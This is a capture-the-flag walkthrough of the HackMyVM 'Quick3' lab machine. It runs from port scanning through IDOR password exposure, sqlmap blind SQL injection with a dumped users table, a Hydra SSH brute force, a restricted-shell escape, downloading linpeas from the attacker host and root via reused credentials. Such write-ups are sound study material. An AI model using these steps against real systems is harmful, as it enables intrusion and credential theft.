<h1 align="center"> Quick3-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=Quick3">Quick3</a></h1/>


## Net Discover & NMAP using a script written in python called (hmv)

```zsh
┌[coolatos©hack]-(~)hmv quick3
┌────────────────────────────────────────────────────────┐
│                                                        │
│   mmm                m            mmmmmmm         mmmm │
│ m"   "  mmm    mmm   #       mmm     #     mmm   #"   "│
│ #      #" "#  #" "#  #      "   #    #    #" "#  "#mmm │
│ #      #   #  #   #  #      m"""#    #    #   #      "#│
│  "mmm" "#m#"  "#m#"  #mmmmm "mm"#    #    "#m#"  "mmm#"│
│                                                        │
│                                                        │
└────────────────────────────────────────────────────────┘

Checking and installing dependencies...
nmap is already installed.

STEP 1: DISCOVERING NETWORKS AND SELECTING ONE...
AVAILABLE NETWORKS:
INDEX  NETWORK              LOCAL IP        GATEWAY IP     
1      xx.xx.xx.xx/24       xx.xx.xx.xx     xx.xx.xx.xx     
2      192.168.56.1/24      192.168.56.1    Not detected   
Select the network to use (number or 'exit' to quit): 2
Gateway IP not detected. Please enter the gateway IP [192.168.56.254]: 
Using network 192.168.56.1/24 with Local IP 192.168.56.1 and Gateway IP 192.168.56.254
DISCOVERING HOSTS ON NETWORK_CIDR...
FOUND TARGET IPS:
192.168.56.4

STEP 2: CREATING DIRECTORIES FOR VM SETUP...
Created directory: /home/coolatos/HMV/quick3
Created directory: /home/coolatos/HMV/quick3/scans
Created directory: /home/coolatos/HMV/quick3/findings
Created directory: /home/coolatos/HMV/quick3/exploits

STEP 3: UPDATING THE HOSTNAME IN /ETC/HOSTS...
192.168.56.4 quick3.hmv
Added 192.168.56.4 quick3.hmv to /etc/hosts file

STEP 4: RUNNING OPTIONAL NMAP SCAN...
Would you like to run an nmap scan on quick3.hmv? (y/n, default is y): y
CHOOSE THE TYPE OF NMAP SCAN:
1. Quick Scan
2. Full Scan
3. Targeted Scan
Enter your choice (default is Full Scan): 
Running nmap -v -p- -sC -sV 192.168.56.4...
```
```zsh
┌[coolatos©hack]-(~/HMV/quick3)ip=192.168.56.4 && url=http://quick3.hmv && cd /home/coolatos/HMV/quick3 && clear && cat /home/coolatos/HMV/quick3/scans/nmap-quick3.log
```

```
# Nmap 7.80 scan initiated Fri Mar 29 14:36:31 2024 as: nmap -v -p- -sC -sV -oN /home/coolatos/HMV/quick2/scans/nmap-quick2.log 192.168.56.4
Nmap scan report for quick3.hmv (192.168.56.4)
Host is up (0.00018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Quick Automative - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

## Feroxbuster

```zsh
┌[coolatos©hack]-(~/HMV/quick3)feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $url -t 500 -o scans/ferox-$ip.log
                                                                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 邏                 ver: 2.10.2
───────────────────────────┬──────────────────────
   Target Url            │ http://quick3.hmv
   Threads               │ 500
   Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
   Status Codes          │ All Status Codes!
   Timeout (secs)        │ 7
 說  User-Agent            │ feroxbuster/2.10.2
   Extract Links         │ true
   Output File           │ scans/ferox-192.168.56.4.log
   Extensions            │ [txt, php, html, zip, htm, bak, pem]
   HTTP methods          │ [GET]
   Recursion Depth       │ 4
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       53l      337w     5013c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      309c http://quick3.hmv/images => http://quick3.hmv/images/
200      GET      206l      690w     9058c http://quick3.hmv/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css
200      GET        1l     1421w    32832c http://quick3.hmv/lib/tempusdominus/js/moment-timezone.min.js
301      GET        9l       28w      306c http://quick3.hmv/css => http://quick3.hmv/css/
200      GET        5l       12w      201c http://quick3.hmv/css/custom.css
200      GET     2050l     4279w    43852c http://quick3.hmv/css/bootstrap-grid.css
200      GET        9l      104w     1960c http://quick3.hmv/css/calendar.min.css
200      GET      142l      313w     2856c http://quick3.hmv/css/calendar.css
...
[>-------------------] - 21s    33077/7064360 75m     found:269     errors:997    
 Caught ctrl+c  saving scan state to ferox-http_quick3_hmv-1711716258.state ...
[>-------------------] - 21s    33194/7064360 75m     found:270     errors:1094   
[>-------------------] - 21s    34216/1764368 1605/s  http://quick3.hmv/ 
[####################] - 7s   1764368/1764368 251621/s http://quick3.hmv/css/ => Directory listing
[####################] - 0s   1764368/1764368 38355826/s http://quick3.hmv/lib/ => Directory listing
[####################] - 0s   1764368/1764368 31506571/s http://quick3.hmv/lib/wow/ => Directory listing
[####################] - 0s   1764368/1764368 44109200/s http://quick3.hmv/lib/tempusdominus/ => Directory listing
[####################] - 0s   1764368/1764368 70574720/s http://quick3.hmv/lib/counterup/ => Directory listing
[####################] - 0s   1764368/1764368 33930154/s http://quick3.hmv/lib/easing/ => Directory listing
[####################] - 0s   1764368/1764368 23524907/s http://quick3.hmv/lib/waypoints/ => Directory listing
[####################] - 0s   1764368/1764368 16644981/s http://quick3.hmv/lib/animate/ => Directory listing
[####################] - 0s   1764368/1764368 9435123/s http://quick3.hmv/lib/owlcarousel/ => Directory listing
[####################] - 0s   1764368/1764368 31506571/s http://quick3.hmv/lib/tempusdominus/css/ => Directory listing
[####################] - 0s   1764368/1764368 4261758/s http://quick3.hmv/lib/tempusdominus/js/ => Directory listing
[####################] - 0s   1764368/1764368 18378833/s http://quick3.hmv/lib/owlcarousel/assets/ => Directory listing
[####################] - 7s   1764368/1764368 251585/s http://quick3.hmv/js/ => Directory listing
[>-------------------] - 18s       56/1764368 3/s     http://quick3.hmv/customer/ 
[####################] - 7s   1764368/1764368 243765/s http://quick3.hmv/modules/ => Directory listing
[####################] - 7s   1764368/1764368 247839/s http://quick3.hmv/img/ => Directory listing
[####################] - 8s   1764368/1764368 226172/s http://quick3.hmv/fonts/ => Directory listing
[####################] - 1s   1764368/1764368 2105451/s http://quick3.hmv/customer/images/ => Directory listing
```
Lets Navigate to Customers page

```zsh
┌[coolatos©hack]-(~/HMV/quick3)brave http://quick3.hmv/customer/
Opening in existing browser session.
```
We found out that we can register and login to this Dashboard

Uper right there on our username there is an arrow pointing down
If you click on the My profile will lead you to ur user profile "Managment"

http://quick3.hmv/customer/user.php?id=29

On Change Password tab

If we inspect we can see that the password is on clear text

Having that in mind and knowing there are other users ( since we have id=29)

Lets try to see if we can access the other users page

Went to id=3 

Right Click Inspect 

Found 
```
<div class="user_info">
<h6> Andrew Speed</h6>
```
```
<form id="passwordForm" action="updatepassword.php" method="post">
<label for="oldpassword" style="display: block;">Retype current password:</label>
<input type="password" id="oldpassword" name="oldpassword" value="oyS6518WQxGK8rmk" required=""><br>
```
lets do this one by one and lets create our lists
one for users
and one for passwords

Another way is to use burpsuite and sqlmap
On our browser go to our profile and 
Go to change our password (id=29)

We can see the Change password is greyed out

we need to change :
```
button type="submit" id="changePasswordButton" disabled>Change Password</button>
```
to 
```
button type="submit" id="changePasswordButton">Change Password</button>
```
Then we will have the Change Password normally 

try to change the password with Burpsuite proxy on and capture the POST request
and 
save it.
```
┌[coolatos©hack]-(~/HMV/quick3/exploits)cat POST.txt 
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2024.1.1.6" exportTime="Mon Apr 01 11:27:43 EEST 2024">
  <item>
    <time>Mon Apr 01 11:22:00 EEST 2024</time>
    <url><![CDATA[http://quick3.hmv/customer/updatepassword.php]]></url>
    <host ip="192.168.56.4">quick3.hmv</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/customer/updatepassword.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvY3VzdG9tZXIvdXBkYXRlcGFzc3dvcmQucGhwIEhUVFAvMS4xDQpIb3N0OiBxdWljazMuaG12DQpDb250ZW50LUxlbmd0aDogNjMNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KT3JpZ2luOiBodHRwOi8vcXVpY2szLmhtdg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOA0KU2VjLUdQQzogMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNg0KUmVmZXJlcjogaHR0cDovL3F1aWNrMy5obXYvY3VzdG9tZXIvdXNlci5waHA/aWQ9MjkNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogUEhQU0VTU0lEPWNtdTBlcGVsZjNobWY2cDRwZDQ2aWphOWJvDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQpvbGRwYXNzd29yZD1jb29sJm5ld3Bhc3N3b3JkPW41TFUxMjMmcm5ld3Bhc3N3b3JkPW41TFUxMjMmaWQ9Mjk=]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
```

Then Use SQLMap
## SQLMAP

```zsh
sqlmap -r get.txt  --threads 10 --dbs --level 5 --risk 3 --random-agent --dump
```
```
[11:30:36] [INFO] POST parameter 'oldpassword' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

[11:31:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:31:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:31:20] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[11:31:21] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[11:31:21] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[11:31:21] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[11:31:21] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[11:31:21] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[11:31:21] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[11:31:21] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[11:31:22] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[11:31:22] [INFO] checking if the injection point on POST parameter 'oldpassword' is a false positive
POST parameter 'oldpassword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 5187 HTTP(s) requests:
---
Parameter: oldpassword (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: oldpassword=cool' AND (SELECT 9259 FROM (SELECT(SLEEP(5)))nGmP)-- LutY&newpassword=n5LU123&rnewpassword=n5LU123&id=29
---
[11:32:16] [INFO] the back-end DBMS is MySQL
[11:32:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[11:32:16] [INFO] fetching database names
[11:32:16] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] 

[11:32:27] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[11:32:44] [INFO] retrieved: 
[11:32:49] [INFO] adjusting time delay to 1 second due to good response times
mysql
[11:33:05] [INFO] retrieved: information_schema
[11:34:05] [INFO] retrieved: performance_schema
[11:35:03] [INFO] retrieved: sys
[11:35:13] [INFO] retrieved: quick
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] quick
[*] sys

[11:35:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:35:27] [INFO] fetching current database
[11:35:27] [INFO] retrieved: quick
[11:35:41] [INFO] fetching tables for database: 'quick'
[11:35:41] [INFO] fetching number of tables for database 'quick'
[11:35:41] [INFO] retrieved: 2
[11:35:43] [INFO] retrieved: cars
[11:35:54] [INFO] retrieved: users
[11:36:10] [INFO] fetching columns for table 'cars' in database 'quick'
[11:36:10] [INFO] retrieved: 6
[11:36:13] [INFO] retrieved: id
[11:36:19] [INFO] retrieved: license_plate
[11:37:04] [INFO] retrieved: brand
[11:37:19] [INFO] retrieved: type
[11:37:35] [INFO] retrieved: y^C
```

Since We dont need the cars table we can stop our sqlmap and focus on quick db ```([11:35:41] [INFO] fetching number of tables for database 'quick')``` and users table ```([11:35:54] [INFO] retrieved: users)```
```zsh
┌[coolatos©hack]-(~/HMV/quick3/exploits)sqlmap -r POST.txt  --threads 10 --dbms MySQL -D quick -T users --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7#pip}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:40:29 /2024-04-01/

[11:40:29] [INFO] parsing HTTP request from 'POST.txt'
[11:40:30] [INFO] testing connection to the target URL
[11:40:30] [INFO] checking if the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: oldpassword (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: oldpassword=cool' AND (SELECT 9259 FROM (SELECT(SLEEP(5)))nGmP)-- LutY&newpassword=n5LU123&rnewpassword=n5LU123&id=29
---
---
[11:40:30] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[11:40:35] [INFO] confirming MySQL
[11:40:35] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[11:40:45] [INFO] adjusting time delay to 1 second due to good response times
[11:40:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 8.0.0
[11:40:45] [INFO] fetching columns for table 'users' in database 'quick'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[11:40:45] [INFO] retrieved: 5
[11:40:47] [INFO] retrieved: id
[11:40:54] [INFO] retrieved: email
[11:41:07] [INFO] retrieved: name
[11:41:19] [INFO] retrieved: password
[11:41:47] [INFO] retrieved: role
[11:42:02] [INFO] fetching entries for table 'users' in database 'quick'
[11:42:02] [INFO] fetching number of entries for table 'users' in database 'quick'
[11:42:02] [INFO] retrieved: 29
[11:42:13] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                    
info@quick.hmv
[11:43:02] [INFO] retrieved: 1
[11:43:04] [INFO] retrieved: Quick
[11:43:18] [INFO] retrieved: q27QAO6FeisAAtbW
[11:44:10] [INFO] retrieved: admin
[11:44:25] [INFO] retrieved: nick.greenhorn@quick.hmv
[11:45:49] [INFO] retrieved: 2
[11:45:52] [INFO] retrieved: Nick Greenhorn
[11:46:40] [INFO] retrieved: H01n8X0fiiBhsNbI
[11:47:40] [INFO] retrieved: employee
[11:48:07] [INFO] retrieved: andrew.speed@quick.hmv
[11:49:22] [INFO] retrieved: 3
[11:49:25] [INFO] retrieved: Andrew Speed
[11:50:05] [INFO] retrieved: oyS6518WQxGK8rmk
[11:51:11] [INFO] retrieved: employee
[11:51:39] [INFO] retrieved: jack.black@email.hmv
[11:52:42] [INFO] retrieved: 4
[11:52:47] [INFO] retrieved: Jack Black
[11:53:15] [INFO] retrieved: 2n5kKKcvumiR7vrz
[11:54:15] [INFO] retrieved: customer
[11:54:41] [INFO] retrieved: mike.cooper@quick.hmv
[11:55:54] [INFO] retrieved: 5
[11:55:58] [INFO] retrieved: Mike Cooper
```

Once it finish we will have users and passwords

## Hydra Time
```zsh
hydra -L users.txt -P pass.txt ssh://192.168.56.4
```
After few seconds,

```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-01 11:45:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1036 login tries (l:37/p:28), ~65 tries per task
[DATA] attacking ssh://192.168.56.4:22/
[22][ssh] host: 192.168.56.4   login: mike   password:  6G3UCx6aH6UYvJ6m
```

## User and escape from restricted shell
```zsh
ssh mike@192.168.56.4                                                         
mike@192.168.56.4's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
```

```zsh
mike@quick3:~$ ls -alh
total 36K
drwxr-x---  4 mike mike 4.0K Mar 29 12:22 .
drwxr-xr-x 11 root root 4.0K Jan 24 10:38 ..
lrwxrwxrwx  1 mike mike    9 Jan 24 10:46 .bash_history -> /dev/null
-rw-r--r--  1 mike mike  220 Jan 21 13:57 .bash_logout
-rw-r--r--  1 mike mike 3.8K Jan 24 12:56 .bashrc
drwx------  2 mike mike 4.0K Jan 21 14:00 .cache
drwxrwxr-x  3 mike mike 4.0K Jan 21 13:58 .local
-rw-r--r--  1 mike mike  807 Jan 21 13:57 .profile
-rw-rw-r--  1 mike mike 4.1K Jan 21 13:58 user.txt
mike@quick3:~$ cat u-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier
```

When we tried to cat the user.txt ( with cat u + tab ) we got this error 
Focus on : ``` -rbash ```

means restricted bash

Following instructions from [this page](https://0xffsec.com/handbook/shells/restricted-shells/)
```zsh
Connection to 192.168.56.4 closed.
ssh mike@192.168.56.4  -t "(){:;}; /bin/bash"                        
mike@192.168.56.4's password: 
rbash: -c: line 1: syntax error near unexpected token `)'
rbash: -c: line 1: `(){:;}; /bin/bash'
Connection to 192.168.56.4 closed.
ssh mike@192.168.56.4 -t "bash --noprofile -i"    
mike@192.168.56.4's password: 
mike@quick3:~$
```
Now we have unrestricted shell

lets focus to find the rootflag

## Escalate to root

```
mike@quick3:~$ sudo -l
[sudo] password for mike: 
Sorry, user mike may not run sudo on quick3.
```
### Linpeas Time
```
mike@quick3:~$ cd /tmp ; wget 192.168.56.1/linpeas.sh 
--2024-04-01 09:06:03--  http://192.168.56.1/linpeas.sh
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860549 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                         100%[================================================================================================================>] 840.38K  --.-KB/s    in 0.007s  

2024-04-01 09:06:03 (118 MB/s) - ‘linpeas.sh’ saved [860549/860549]

mike@quick3:/tmp$ chmod +x linpeas.sh 
mike@quick3:/tmp$ ./linpeas.sh | more
```
Nothing Special cought my eye.

Then i remember the updatepassword.php we used earlier for the sqlmap

lets find it and have a look at it

```
mike@quick3:/tmp$ locate updatepassword.php
Command 'locate' not found, but can be installed with:
apt install plocate
Please ask your administrator.
mike@quick3:/tmp$ find / -name 'updatepassword.php' 2>/dev/null
/var/www/html/customer/updatepassword.php
```
```zsh
mike@quick3:/tmp$ head /var/www/html/customer/updatepassword.php
<?php
// database connection
$servername = "localhost";
$username = "root";
$password = "deducted";
$dbname = "quick";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
```
```zsh
mike@quick3:/tmp$ su root
Password: 
root@quick3:/tmp# 
```


